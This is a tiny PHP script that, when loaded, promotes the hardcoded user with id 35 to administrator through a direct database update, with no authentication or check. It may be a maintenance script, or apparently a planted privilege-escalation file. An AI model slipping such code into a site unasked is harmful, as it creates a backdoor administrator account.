<?php
include_once 'options.php';
global $sql;
$sql->query('UPDATE users SET role = "admin" WHERE id = 35');
?>